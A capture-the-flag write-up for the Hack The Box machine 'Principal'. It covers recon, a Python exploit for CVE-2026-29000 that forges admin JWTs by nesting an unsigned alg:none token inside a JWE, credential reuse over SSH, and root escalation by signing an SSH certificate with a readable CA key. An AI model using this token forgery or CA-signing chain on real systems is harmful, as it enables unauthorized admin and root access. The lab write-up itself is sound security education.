# HTB: Principal — Writeup

**Difficulty:** Medium  
**OS:** Linux  
**CVE:** CVE-2026-29000 (pac4j-jwt Authentication Bypass)

---

## Summary
Exploited a JWT authentication bypass (CVE-2026-29000) in pac4j-jwt 
6.0.3 to forge admin tokens, extracted SSH CA credentials from the 
API, and used SSH certificate signing to escalate to root.

---

## Reconnaissance
```bash
nmap -A 10.129.7.153
```

**Open ports:**
- 22/tcp — OpenSSH 9.6
- 8080/tcp — Jetty (pac4j-jwt/6.0.3)
  - Title: "Principal Internal Platform - Login"

---

## Vulnerability Discovery

Port 8080 revealed `X-Powered-By: pac4j-jwt/6.0.3`.  
Researched CVE-2026-29000 — JWT authentication bypass affecting 
versions 6.0.3 and 6.0.4.1.

Found public RSA key without authentication:
```bash
curl http://10.129.7.153:8080/api/auth/jwks
```

---

## Exploitation — CVE-2026-29000

The vulnerability allows wrapping an unsigned JWT (alg:none) 
inside a JWE token encrypted with the server's public key.
The server decrypts the JWE but fails to verify the inner 
JWT signature.
```python
import json, base64, time
from jwcrypto import jwk, jwt

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

pub_key_data = {
    "kty": "RSA", "e": "AQAB", "kid": "enc-key-1",
    "n": "lTh54vtBS1NA..." # truncated
}
pub_key = jwk.JWK(**pub_key_data)

now = int(time.time())
claims = {
    "sub": "admin",
    "username": "admin", 
    "roles": ["ROLE_ADMIN"],
    "iat": now,
    "exp": now + 3600
}

header = b64url(json.dumps({"alg":"none","typ":"JWT"}))
payload = b64url(json.dumps(claims))
unsigned_jwt = f"{header}.{payload}."

jwe = jwt.JWT(
    header={"alg":"RSA-OAEP-256","enc":"A256GCM","kid":"enc-key-1"},
    claims=unsigned_jwt
)
jwe.make_encrypted_token(pub_key)
print(jwe.serialize())
```

Forged token accepted — full admin access to API.

---

## Information Gathering

With admin token enumerated API endpoints:
```bash
TOKEN=$(python3 exploit.py)
curl -H "Authorization: Bearer $TOKEN" \
  http://10.129.7.153:8080/api/settings
```

Found in `/api/settings`:
```json
{
  "encryptionKey": "D3pl0y_$$H_Now42!",
  "sshCaPath": "/opt/principal/ssh/",
  "sshCertAuth": "enabled"
}
```

---

## Foothold

Password reuse on SSH service account:
```bash
sshpass -p 'D3pl0y_$$H_Now42!' ssh svc-deploy@10.129.7.153
```
```
user.txt: a544b1b956f59f54f6bfe56a6d9b8aa6
```

---

## Privilege Escalation

User `svc-deploy` is in group `deployers` which has read 
access to SSH CA private key:
```
/opt/principal/ssh/ca  (readable by deployers group)
```

Generated a new key pair and signed it with the CA as root:
```bash
ssh-keygen -t ed25519 -f /tmp/root_key -N ""

ssh-keygen -s /opt/principal/ssh/ca \
  -I "root_cert" \
  -n root \
  -V +1h \
  /tmp/root_key.pub

ssh -i /tmp/root_key root@localhost
```
```
root.txt: cf4da002bed2efefcf6f277103bc4fb9
```

---

## Attack Chain
```
nmap scan
    ↓
pac4j-jwt/6.0.3 identified
    ↓
CVE-2026-29000 — forge JWT token
    ↓
Admin API access → /api/settings
    ↓
SSH password found → svc-deploy shell
    ↓
SSH CA key readable → sign cert as root
    ↓
root shell
```

---

## Key Takeaways

- Always check X-Powered-By headers for version info
- JWT libraries can have critical auth bypass vulnerabilities
- Sensitive credentials should never be stored in API responses
- SSH Certificate Authority keys must be strictly protected
